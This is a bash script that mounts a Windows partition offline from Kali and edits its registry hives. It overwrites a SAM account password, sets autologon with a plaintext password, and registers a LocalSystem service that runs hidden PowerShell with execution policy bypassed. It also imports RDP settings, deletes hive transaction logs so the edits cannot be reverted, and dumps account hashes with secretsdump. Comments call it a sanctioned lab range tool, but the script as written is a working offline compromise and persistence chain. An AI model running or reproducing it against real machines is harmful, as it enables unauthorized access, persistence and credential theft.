#!/bin/bash
# megacycle2.sh — re-import EVERYTHING (SAM pw, Winlogon, VarvelBoot, RDP) then DELETE the
# dirty hive transaction logs so Windows can't replay-revert our edits at boot.
echo kali | sudo -S true 2>/dev/null
PART=$(lsblk -ln -o NAME,SIZE,FSTYPE | awk '$2=="59G" && $3=="ntfs" {print $1}')
sudo -n ntfsfix -d /dev/$PART >/dev/null 2>&1
sudo -n mkdir -p /mnt/tgt
sudo -n mount -t ntfs-3g -o rw,recover /dev/$PART /mnt/tgt && echo MOUNTED
C=/mnt/tgt/Windows/System32/config

echo "=====SAM password re-import====="
if [ ! -f /tmp/sam-v.reg ]; then python3 /tmp/sampset.py || echo SAMSET-FAILED; fi
echo y | sudo -n reged -I $C/SAM 'HKEY_LOCAL_MACHINE\SAM' /tmp/sam-v.reg | grep -E 'END|Commit|OK'

echo "=====Winlogon re-import====="
cat > /tmp/winlogon6.reg <<'REGEOF'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
"AutoAdminLogon"="1"
"DefaultUserName"="target"
"DefaultPassword"="TargetLab1!"
"DefaultDomainName"="ENCLAVE-TGT"
REGEOF
echo y | sudo -n reged -I $C/SOFTWARE 'HKEY_LOCAL_MACHINE\SOFTWARE' /tmp/winlogon6.reg | grep -E 'END|Commit|OK'

echo "=====VarvelBoot service re-import====="
cat > /tmp/svc2.reg <<'REGEOF'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VarvelBoot]
"Type"=dword:00000010
"Start"=dword:00000002
"ErrorControl"=dword:00000001
"ImagePath"="C:\\Windows\\System32\\cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\va-boot.ps1"
"ObjectName"="LocalSystem"
"DisplayName"="VARVEL Range Boot Agent"
"Description"="Enclave range: registers the governed VARVEL agent at boot (sanctioned lab launcher)."
REGEOF
echo y | sudo -n reged -I $C/SYSTEM 'HKEY_LOCAL_MACHINE\SYSTEM' /tmp/svc2.reg | grep -E 'END|Commit|OK'

echo "=====RDP re-import====="
echo y | sudo -n reged -I $C/SYSTEM 'HKEY_LOCAL_MACHINE\SYSTEM' /tmp/rdp.reg | grep -E 'END|Commit|OK'

echo "=====DELETE dirty hive transaction logs====="
sudo -n rm -f $C/SYSTEM.LOG1 $C/SYSTEM.LOG2 $C/SOFTWARE.LOG1 $C/SOFTWARE.LOG2 $C/SAM.LOG1 $C/SAM.LOG2 $C/SECURITY.LOG1 $C/SECURITY.LOG2
sudo -n ls $C | grep -iE '\.LOG' | head -5
echo "(no .LOG files left above = good)"

echo "=====FINAL VERIFY====="
printf 'cd Microsoft\\Windows NT\\CurrentVersion\\Winlogon\ncat AutoAdminLogon\nq\n' | sudo -n chntpw -e $C/SOFTWARE 2>&1 | grep -A2 AutoAdminLogon | head -3
printf 'cd ControlSet001\\Services\\VarvelBoot\ncat Start\nq\n' | sudo -n chntpw -e $C/SYSTEM 2>&1 | grep -A2 -E 'Start|not found' | head -3
sudo -n cp $C/SAM $C/SYSTEM /tmp/ && sudo -n chmod 666 /tmp/SAM /tmp/SYSTEM && impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL 2>&1 | grep '^target'
sudo -n umount /mnt/tgt && echo UNMOUNTED
